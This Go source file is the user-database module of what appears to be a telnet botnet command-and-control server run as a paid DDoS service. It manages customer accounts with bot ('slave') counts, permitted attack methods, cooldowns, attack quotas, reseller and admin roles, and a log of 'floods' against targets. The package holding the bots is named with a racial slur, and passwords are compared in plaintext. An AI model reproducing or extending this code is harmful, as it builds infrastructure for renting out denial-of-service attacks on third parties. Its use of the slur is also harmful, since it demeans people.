package database

import (
	"advanced-telnet-cnc/source/niggers"
	"errors"
	"fmt"
	"time"
)

var (
	GlobalRestricted = []int{
		//	11,
		//		7,
		5, 3, 1,
	}
)

func CreateUser(user *UserProfile, existsCheck bool) error {
	if existsCheck {
		exists, err := Exists(user.Name)
		if err != nil {
			return err
		}

		if exists {
			return ErrKnownUser
		}

		return createUser(user)
	}
	return createUser(user)
}

func (user *UserProfile) Remove() error {
	exists, err := Exists(user.Name)
	if err != nil {
		return err
	}
	if !exists {
		return ErrUnknownUser
	}
	_, err = Instance.Exec("DELETE FROM users WHERE username=?", user.Name)
	return err
}

func (user *UserProfile) SlaveCount() int {
	if user.Devices == -1 {
		return niggers.Count()
	}

	if niggers.Count() < user.Devices {
		return niggers.Count()
	}

	return user.Devices
}

func (user *UserProfile) MethodAllowed(method int) bool {
	if user.MethodGloballyBlacklisted(method) && !user.Admin {
		return false
	}
	return user.methodAllowed(method) || user.methodAllowed(-1)
}

func (user *UserProfile) LastFlood() (*Flood, error) {
	rows, err := Instance.Query("SELECT * FROM logs WHERE rowid = (SELECT MAX(rowid) FROM logs WHERE user_id = ?)", user.Id)
	if err != nil {
		return nil, err
	}

	defer rows.Close()

	if rows.Next() {
		var flood = &Flood{}

		var created int64
		var end int64
		err := rows.Scan(&flood.Id, &flood.UserId, &flood.Target, &flood.Duration, &flood.Method, &created, &end)
		if err != nil {
			return nil, err
		}

		flood.Created = time.Unix(created, 0)
		flood.End = time.Unix(end, 0)

		return flood, nil
	}

	return nil, nil
}

func (user *UserProfile) Attacks() (left int, maximum int, err error) {
	rows, err := Instance.Query("SELECT * FROM logs WHERE user_id=?", user.Id)
	if err != nil {
		fmt.Println(err)
		return 0, 0, err
	}

	defer rows.Close()

	var attacksSent = 0
	for rows.Next() {
		attacksSent++
	}

	return user.MaxAttacks - attacksSent, user.MaxAttacks, nil
}

/* ----------------------------------------------------------------------------------- */

func UserFromName(name string) (*UserProfile, error) {
	rows, err := Instance.Query("SELECT * FROM users WHERE username=?", name)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	if rows.Next() {
		var user UserProfile
		var methods string
		var expiry int64

		err := rows.Scan(&user.Id, &user.Name, &user.Password, &methods, &user.Cooldown, &user.MaxTime, &user.MaxAttacks, &user.Devices, &user.Admin, &user.Reseller, &expiry)
		if err != nil {
			return nil, err
		}

		user.Expiry = time.Unix(expiry, 0)
		user.Methods = MethodsToInt(methods)

		if user.Reseller {
			user.Role = "reseller"
		} else if user.Admin {
			user.Role = "admin"
		} else {
			user.Role = "user"
		}

		return &user, nil
	}

	return nil, errors.New("user does not exist")
}

func Users() ([]*UserProfile, error) {
	var users []*UserProfile
	rows, err := Instance.Query("SELECT * FROM users")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	for rows.Next() {
		var user UserProfile
		var methods string
		var expiry int64

		err := rows.Scan(&user.Id, &user.Name, &user.Password, &methods, &user.Cooldown, &user.MaxTime, &user.MaxAttacks, &user.Devices, &user.Admin, &user.Reseller, &expiry)
		if err != nil {
			return nil, err
		}

		user.Expiry = time.Unix(expiry, 0)
		user.Methods = MethodsToInt(methods)

		users = append(users, &user)
	}

	return users, nil
}

func UserFromId(id int) (*UserProfile, error) {
	rows, err := Instance.Query("SELECT * FROM users WHERE id=?", id)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	if rows.Next() {
		var user UserProfile
		var methods string
		var expiry int64

		err := rows.Scan(&user.Id, &user.Name, &user.Password, &methods, &user.Cooldown, &user.MaxTime, &user.MaxAttacks, &user.Devices, &user.Admin, &user.Reseller, &expiry)
		if err != nil {
			return nil, err
		}

		user.Expiry = time.Unix(expiry, 0)
		user.Methods = MethodsToInt(methods)

		return &user, nil
	}
	return nil, nil
}

func Exists(name string) (bool, error) {
	result, err := Instance.Query("SELECT * FROM users WHERE username=?", name)
	if err != nil {
		return false, err
	}
	defer result.Close()
	return result.Next(), nil
}

func VerifyCredentials(name, password string) error {
	user, err := UserFromName(name)
	if err != nil {
		return err
	}
	if user == nil {
		return ErrUnknownUser
	}
	if user.Password != password {
		return ErrCredentialsInvalid
	}
	return nil
}

func createUser(user *UserProfile) error {
	_, err := Instance.Exec("INSERT INTO users (username, password, methods, cooldown, max_time, max_attacks, devices, admin, reseller, expiry) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", user.Name, user.Password, MethodsToStr(user.Methods), user.Cooldown, user.MaxTime, user.MaxAttacks, user.Devices, user.Admin, user.Reseller, user.Expiry.Unix())
	return err
}

func SetUser(user *UserProfile) error {
	_, err := Instance.Exec("UPDATE users SET username=?, password=?, methods=?, cooldown=?, max_time=?, max_attacks=?, devices=?, admin=?, reseller=?, expiry=? WHERE username=?", user.Name, user.Password, MethodsToStr(user.Methods), user.Cooldown, user.MaxTime, user.MaxAttacks, user.Devices, user.Admin, user.Reseller, user.Expiry.Unix(), user.Name)
	return err
}
